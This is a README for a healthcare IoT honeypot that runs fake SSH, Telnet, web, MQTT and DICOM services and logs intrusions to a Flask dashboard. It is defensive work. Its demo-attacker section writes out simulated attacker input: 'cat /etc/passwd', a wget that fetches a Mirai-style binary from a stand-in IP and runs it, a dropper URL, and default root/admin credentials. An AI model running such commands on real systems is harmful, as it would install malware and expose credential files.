## Project Idea : This project is a Healthcare IoT Deception Honeypot Network.

In simple words, it creates fake vulnerable hospital IoT devices to attract attackers. When an attacker tries to connect, login, scan, or run commands, the system records everything and shows it on a live dashboard.

It does not expose real hospital devices. It only simulates them safely.

### Real-World Problem
Hospitals use many connected devices:

Patient monitors
Smart infusion pumps
Medical imaging systems
HVAC systems
IoT sensors
Telemetry devices

Many IoT devices are weak because they may have:

- Default passwords
- Old firmware
- Open Telnet/SSH ports
- Poor logging
- Weak web panels

Attackers scan for these devices to enter the hospital network. This project helps detect such activity early.

### What The Project Does ?
The project runs fake services on different ports:

2222 - Fake SSH banner trap
2223 - Fake Telnet medical shell
8081 - Fake biomedical web panel
1883 - Fake MQTT telemetry trap
2104 - Fake DICOM medical imaging trap
8000 - Flask dashboard

When someone interacts with these fake services, the project logs:

- Attacker IP address
- Targeted service
- Login username/password tried
- Commands typed
- Payload or malware URLs
- HTTP requests
- MQTT probes
- DICOM probes
- Risk score
- Attack technique category

Then the dashboard shows these events live.

### Main Files

src/honeynet/honeypot.py
This is the main honeypot logic. It creates fake SSH, Telnet, HTTP, MQTT, and DICOM services.

src/honeynet/dashboard.py
This creates the Flask backend API and realtime event stream.

src/honeynet/storage.py
This saves events into SQLite database and JSONL log files.

src/honeynet/analytics.py
This analyzes attacks, counts commands, services, IPs, and attack techniques.

src/honeynet/demo_attack.py
This is a safe demo attacker script. It sends fake attack traffic to prove the honeypot works.

src/honeynet/static/app.js
src/honeynet/static/styles.css
src/honeynet/templates/index.html
These create the frontend dashboard.

## How The Project Works Internally
### Step by step:

1. You run the project.
2. The Python backend starts multiple fake IoT services.
3. The Flask dashboard starts on port 8000.
4. Fake services wait for connections.
5. If someone connects, the service records the activity.
6. Events are saved in data/honeypot.db and data/events.jsonl.
7. Dashboard fetches events from Flask APIs.
8. Dashboard updates live using Server-Sent Events.
9. How demo_attack.py Works
10. The demo_attack.py file acts like a safe fake attacker.

It does not damage anything. It only sends test traffic to your own local honeypot.

## It performs these actions:

### 1. SSH Probe
It connects to port 2222.

The honeypot sends a fake SSH banner like:
- ,SSH-2.0-OpenSSH_7.2p2

The demo script sends a fake SSH client string.

Purpose:
To test if SSH scanning is logged.

### 2. Telnet Attack
It connects to port 2223.

It tries login values:

username: root
password: admin

Then it runs commands like:

uname -a
cat /etc/passwd
ifconfig
wget http://203.0.113.50/mirai.arm -O /tmp/.x
chmod +x /tmp/.x; /tmp/.x
exit
Purpose:

To simulate an attacker who got into a weak IoT Telnet shell.

The honeypot logs:

- Login attempt
- Commands typed
- Malware download URL
- Suspicious chmod command
- Important point:

The commands are not really executed. They are only captured and logged.

### 3. HTTP Attack
It connects to fake medical web panel on port 8081.

It sends:

GET /
POST /login.cgi
POST /firmware/upload
It tries credentials:

admin / admin
It also sends a fake firmware URL:

http://203.0.113.99/dropper.sh
Purpose:

To simulate attacking a weak biomedical device web panel.

### 4. MQTT Probe
It connects to port 1883.

MQTT is commonly used for IoT telemetry. The script sends a fake MQTT connect packet using a client name like:

med-pump-7
Purpose:

To detect IoT telemetry probing.
5. DICOM Probe
It connects to port 2104.

DICOM is used in medical imaging systems.

Purpose:
To simulate scanning medical imaging services.

### What The Dashboard Shows
The dashboard shows:

- Total Events
- Top Source IP
- Top Targeted Service
- Top Attack Technique
- Live Event Stream
- Attack Origins
- Services Targeted
- Commands Observed
- Technique Hints
- Risk Scores

Example event:
Source IP: 127.0.0.1
Service: telnet
Event: command
Command: cat /etc/passwd
Technique: Account Discovery
Risk: High

### What The Project Finds Out

### This project helps find:

- Who is scanning the network
- Which service they are attacking
- What username/password they tried
- What commands they typed
- Whether they tried downloading malware
- Whether they targeted IoT protocols
- Whether an internal system is suspicious

In a real hospital network, if an internal IP touches the honeypot, that may mean:

A hospital machine is compromised
Someone is scanning internally
There is lateral movement
A device is misconfigured
Important Security Concepts Used

### Honeypot : A fake system designed to attract attackers.

Deception Security
Using fake assets to trick attackers and study them.

Low-Interaction Honeypot
It gives limited fake responses but does not provide a real operating system.

Threat Intelligence
Useful information about attacker behavior, IPs, commands, and payloads.

IoC - Indicator of Compromise
Evidence like suspicious IPs, commands, URLs, or malware hashes.

Sandboxing
Keeping attackers isolated so they cannot reach real systems.

Why This Project Is Safe

### This project is safe because:

- It does not run real attacker commands
- It does not download malware
- It does not expose real hospital devices
- It only records interactions
- It uses fake responses
- It stores logs locally

#### How To Explain The Project In Presentation
You can say:

#### “This project simulates vulnerable healthcare IoT devices such as patient monitors, telemetry devices, and medical web panels. Attackers are attracted to these fake services. When they try to login, scan, upload firmware, or run shell commands, the system captures every interaction and shows it on a real-time Flask dashboard. This helps security teams detect reconnaissance, default credential attacks, malware download attempts, and possible internal lateral movement before real hospital devices are affected.”

### One-Line Explanation
This project is a fake hospital IoT network that traps attackers, records their behavior, analyzes their actions, and shows live threat intelligence on a dashboard.
